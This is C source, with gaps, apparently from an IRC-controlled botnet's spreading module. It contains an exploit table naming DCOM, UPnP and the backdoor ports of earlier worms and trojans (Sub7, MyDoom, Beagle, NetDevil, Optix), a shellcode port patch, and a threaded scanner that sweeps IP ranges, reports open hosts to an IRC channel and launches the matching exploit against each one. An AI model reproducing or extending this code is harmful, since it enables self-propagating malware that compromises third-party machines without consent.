...
EXPLOITS ExploitList[30] = { // max of 30 exploits ;)
/*	#ifndef NO_NETBIOS
	...
	#endif
	#ifndef NO_DCOM2
	{"dcom2-135", "Dcom2-135", 135, dcom2, 0, TRUE, FALSE},
	{"dcom2-445", "Dcom2-455", 445, dcom2, 0, TRUE, FALSE},
	#endif
	#ifndef NO_IIS5SSL
	...
	#endif
	#ifndef NO_BEAGLE
	{"beagle1", "Beagle1", 2745, Beagle, 0, TRUE, FALSE},
	{"beagle2", "Beagle2", 2745, Beagle, 0, TRUE, FALSE},
	#endif
	#ifndef NO_MYDOOM
	{"mydoom", "MyDoom", 3127, MyDoom, 0, TRUE, FALSE},
	#endif
	#ifndef NO_OPTIX
	{"optix", "Optix", 3410, Optix, 0, TRUE, FALSE},
	#endif
	#ifndef NO_UPNP
	{"upnp", "UPNP", 5000, upnp, 0, TRUE, FALSE},
	#endif
	#ifndef NO_NETDEVIL
	{"netdevil","NetDevil", 901, NetDevil, 0, TRUE, FALSE},
	{"netdevil2","NetDevil2", 903, NetDevil, 0, TRUE, FALSE},
	#endif
	#ifndef NO_DAMEWARE
	...
	#endif
	#ifndef NO_SUB7
	{"sub7", "Sub7", 27374, Sub7, 0, TRUE, FALSE},
	#endif
*/
//	{"tCmds", "tNames", 111, NULL, 0},
	{NULL, NULL, 0, NULL, 0},
	{NULL, NULL, 0, NULL, 0},
	{NULL, NULL, 0, NULL, 0},
	{NULL, NULL, 0, NULL, 0},
...
/*
	unsigned short port = htons(25083)^(USHORT)0x8080;
	memcpy(&shellcode[219], &port, 2);
*/
...
//		memcpy(&host, &advinfo[threadnum].ip, 4);
		*CurrentIP = ntohl(*CurrentIP);
		*CurrentIP += 1;
		*CurrentIP = htonl(*CurrentIP);
		memcpy(&ip, &*CurrentIP, 4);
...
{
	ADVSCANTHREAD thread = *((ADVSCANTHREAD *)lpParam);
	ADVSCANTHREAD* xinfo = (ADVSCANTHREAD *)lpParam;

	int Threadnum = thread.sThreadnum;

	int ThreadID = thread.sThreadID;
...
//	int threadid=scan.cthreadid;
	...
	while (xinfo->Active)
	{
		...
		if (thread.Random)
			dwIP = XAdvGetNextIPRandom(threads[thread.Threadnum].ThreadCriticalSection, thread.ip);
		else
			dwIP = XAdvGetNextIP(threads[thread.Threadnum].ThreadCriticalSection, &xinfo->CurrentIP);
//
		if (!dwIP)
			goto end;
		...
		XThreadTitle(Threadnum, "[ADVSCAN]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", inet_ntoa(in), thread.Port, threads[Threadnum].ParentThreadID, ThreadID);
		
		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[ADVSCAN]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", inet_ntoa(in), thread.Port, threads[Threadnum].ParentThreadID, ThreadID);
//		Sleep(15000);
//	}
//		sprintf(threads[threadnum].name, logbuf);

		if (XAdvCheckPort(dwIP, thread.Port, thread.Delay))
		{
			XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[ADVSCAN]: Found %s:%d", inet_ntoa(in), thread.Port);
...
//				addlog(logbuf);
		...
		//		LeaveCriticalSection(&CriticalSection);
			...
			else
			{
				...
				strncpy(exinfo.ip, inet_ntoa(in), sizeof(exinfo.ip)-1);
				strncpy(exinfo.Command, ExploitList[thread.Exploit].Command, sizeof(exinfo.Command)-1);
				strncpy(exinfo.Name, ExploitList[thread.Exploit].Name, sizeof(exinfo.Name)-1);
				exinfo.Port = ExploitList[thread.Exploit].Port;
				memcpy(&exinfo.Session, &thread.Session, sizeof(SESSION));

				ExploitList[thread.Exploit].exp(exinfo);
...
DWORD WINAPI XAdvScannerThread(LPVOID lpParam)
{
	...
	thread.CurrentIP = inet_addr(thread.ip);

	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[ADVSCAN]: %s Port Scan started from: %s:%d using %d threads with delay of %d seconds for %d minutes!", (thread.Random)?("Random"):("Sequential"), thread.ip, thread.Port, thread.MaxThreads, thread.Delay, thread.Minutes);
...
//	advinfo[thread.Threadnum].info = TRUE;
	for (t = 1; t <= thread.MaxThreads; t++)
	{
		#ifdef DEBUG_SYSTEM
		dbg("t: %d", t);
		#endif
		...
		thread.sThreadnum = XAddThread(ADVSCANNER_THREAD, FALSE, NULL, "[ADVSCAN]: %s:%d, Scan thread: %d, Sub-thread: %d.", thread.ip, thread.Port, thread.Threadnum, thread.sThreadID);

		if (thread.sThreadnum == -1)
		{
			Sleep(100);
			continue;
		}

		threads[thread.sThreadnum].ParentThreadID = thread.Threadnum;

		if (threads[thread.sThreadnum].ThreadHandle = CreateThread(NULL, 0, &XAdvPortScannerThread, (LPVOID)&thread, 0, &threads[thread.sThreadnum].ID))
		{
			while (!thread.sGotit)
			{
				#ifdef DEBUG_SYSTEM
	...
	if (thread.Minutes)
		Sleep(thread.Minutes * 60000);
	else 
		while (1)
			Sleep(5000);

//	IN_ADDR in;
//	in.s_addr = advinfo[thread.Threadnum].ip;
//	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[ADVSCAN]: Finished at %s:%d after %d minute(s) of scanning.", inet_ntoa(in), thread.Port, thread.Minutes);

	thread.Active = FALSE;
//	advinfo[thread.Threadnum].info = FALSE;

	while (1)
	{
		if (XFindThreadByID(ADVSCANNER_THREAD) == 1)
			break;
		else
			Sleep(1000*1000);
	}
